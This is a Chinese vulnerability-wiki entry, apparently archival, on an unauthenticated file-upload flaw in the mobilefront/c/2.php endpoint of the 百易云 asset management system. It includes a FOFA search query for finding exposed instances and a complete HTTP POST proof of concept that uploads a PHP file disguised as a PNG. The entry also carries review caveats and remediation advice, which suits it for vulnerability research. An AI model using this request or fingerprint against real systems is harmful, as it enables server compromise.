---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "百易云资产管理运营 mobilefront/c/2.php上传"
product: "百易云资产管理运营"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本/落地目录未知"
prerequisites: "无Cookie样例"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%99%BE%E6%98%93/%E7%99%BE%E6%98%93%E4%BA%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%20mobilefrontc2.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"不要着急，点此\""
id: "vw-faef75c02d68444fd1f9c87b"
entity_id: "ve-faef75c02d68444fd1f9c87b"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 百易云资产管理运营 mobilefront/c/2.php上传

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：百易云资产管理运营；mobilefront/c/2.php上传
- 版本、配置及部署条件：版本/落地目录未知
- 认证与权限前提：无Cookie样例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- PHP样例phpinfo后unlink自删除，应标副作用，不当纯上传检测
- 缺返回路径/回读请求文本，执行仅截图未视检
- 标题路径去斜杠影响检索；版本/补丁/在野出处缺

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

百易云资产管理运营系统 mobilefront/c/2.php 接口存在文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。

## 影响版本

百易云资产管理运营系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="不要着急，点此"

POC/EXP：

```http
POST /mobilefront/c/2.php HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest

-----------------------------289666258334735365651210512949
Content-Disposition: form-data; name="file1"; filename="2.php"
Content-Type: image/png

<?php phpinfo();unlink(__FILE__);?>
-----------------------------289666258334735365651210512949--
```


![image-20241125205540925](./.resource/百易云资产管理运营系统mobilefrontc2.php任意文件上传漏洞/media/image-20241125205540925.png)


![image-20241125205605039](./.resource/百易云资产管理运营系统mobilefrontc2.php任意文件上传漏洞/media/image-20241125205605039.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
